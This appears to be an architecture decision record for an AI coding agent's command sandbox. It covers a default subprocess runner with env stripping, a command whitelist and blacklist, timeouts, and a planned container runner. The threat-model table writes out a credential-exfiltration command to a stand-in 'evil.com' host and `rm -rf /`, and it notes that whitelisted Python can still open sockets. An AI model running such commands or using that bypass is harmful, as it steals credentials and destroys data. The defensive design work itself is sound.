# ADR-003: Pluggable sandbox — `LocalSubprocessRunner` default, `ContainerRunner` opt-in

**Status**: accepted (LocalSubprocessRunner implemented; ContainerRunner planned)
**Date**: 2026-05-26
**Deciders**: Álvaro

## Context

The agent generates shell commands and executes them. That code is untrusted by definition
(an LLM wrote it). A sandbox must:

1. Stop the agent from clobbering files outside the workspace.
2. Stop obvious destructive commands (`rm -rf`, `curl http://exfil`, `sudo`, ...).
3. Cap wall-clock time so a runaway loop doesn't burn forever.
4. Ideally, isolate network and memory.

Constraints in this project:
- Dev environment is Windows 11 without admin rights (user statement). That removes Docker
  Desktop and any tooling that needs Hyper-V/WSL2 configuration as a prerequisite.
- The same code must work locally for development and in GitHub Actions Ubuntu runners for CI.
- Production deployments will run inside containers anyway.

## Alternatives considered

1. **Docker per-task with `--network none`** — strongest isolation: process, filesystem,
   network. Requires Docker Desktop (or daemon) — needs admin on Windows.
2. **Podman per-task** — drop-in Docker replacement, rootless, doesn't require admin in
   theory. In practice on Windows still needs WSL2 setup.
3. **firejail / nsjail / bwrap** — Linux-only. Not portable to Windows dev.
4. **E2B / Modal managed sandboxes** — fully managed, network-isolated containers as a
   service. Costs $$ per run and adds a network dependency.
5. **Local subprocess with cleared env + command whitelist + filesystem snapshot diff** —
   no admin needed, no extra install, runs on Windows and Linux. Weaker isolation than (1):
   no network or memory limits, kernel still shared.

## Decision

Define a `SandboxRunner` protocol in
[`src/issue_to_pr/sandbox/runner.py`](../../src/issue_to_pr/sandbox/runner.py). Two
implementations behind the same interface:

- **`LocalSubprocessRunner`** (default, implemented now):
  - CWD pinned to a tempdir workspace.
  - Env stripped to a Windows-safe / POSIX-safe allowlist (no `GROQ_API_KEY`, no `AWS_*`, no
    `SSH_AUTH_SOCK`, no `HOME` to the real home).
  - `HOME` / `USERPROFILE` redirected to the workspace so accidental writes land inside it.
  - Two-stage command check: whitelist of executables (python, pytest, git, ruff, ls, cat,
    echo, grep, find, ...) + blacklist of substrings (`rm -rf`, `curl`, `wget`, `sudo`,
    `chmod 777`, command substitution `$(`/`` ` ``, ...).
  - Subprocess timeout (configurable, default 60 s).
  - SHA-256 snapshot of every file before/after the run → `files_created` / `files_modified`
    / `files_deleted` reported to the executor and surfaced in tool results.
- **`ContainerRunner`** (planned, lands when Podman/Docker is available):
  - Same protocol, Podman/Docker per-task: `--network none`, memory cap, RW mount of the
    workspace, 20-minute watchdog.

## Threat model (the honest version)

| Threat | LocalSubprocessRunner | ContainerRunner |
|---|---|---|
| Agent writes outside workspace via relative path | blocked by `_safe_resolve` (tool layer) + snapshot diff visibility | blocked by mount |
| Agent runs `rm -rf /` | blocked by blacklist | blocked + container has nothing to delete |
| Agent calls `curl evil.com/$(cat ~/.aws/credentials)` | blocked by blacklist (curl, `$(`) + cleared env removes creds | blocked + `--network none` |
| Agent runs `python -c "import socket; ..."` | **not blocked** (python is whitelisted, can open sockets) | blocked by `--network none` |
| Agent forks a memory-bomb | timeout fires eventually | memory cap fires immediately |
| Adversarial agent crafted to evade | weak — defence-in-depth, not a boundary | strong |

We accept this asymmetry explicitly. The trivial eval set + SWE-bench Lite are not adversarial
inputs; they are real bugs from open-source projects. The threat is accidental harm during
dev, not an attacker. Production must use ContainerRunner.

## Consequences

**Easier**:
- Onboarding is `uv sync && uv run pytest` — no Docker prerequisite.
- CI runs on a stock GitHub Actions Ubuntu runner without configuring container engines.
- One interface; future swap to Podman/Docker doesn't touch the executor.

**Harder**:
- Honest threat model means we must document the limitations in this ADR and in the README.
  We chose not to oversell isolation in marketing copy.
- We carry two implementations once `ContainerRunner` lands.

**Accepted**:
- The default sandbox is not safe against a hostile agent. It is safe against the agents we
  actually run (trivial bug fixes generated by `gpt-oss-20b` solving small Python issues).
  This trade-off is the only reason the project ships without admin rights.

## Verification

- 20 unit tests in [`tests/unit/test_sandbox.py`](../../tests/unit/test_sandbox.py) cover
  whitelist, blacklist, timeout, env stripping, snapshot diff, traversal blocking.
- The trivial eval suite resolves 10/10 issues with this runner, with zero files written
  outside the workspace (verified by snapshot diff on every run).
- Future regression gate: a future test must attempt `curl http://example.com`, `cd / && rm`,
  and a network-open Python script; the first two are rejected, the third logs a warning
  reminding that LocalSubprocessRunner does NOT isolate network. (Network test only
  passes meaningfully with ContainerRunner.)
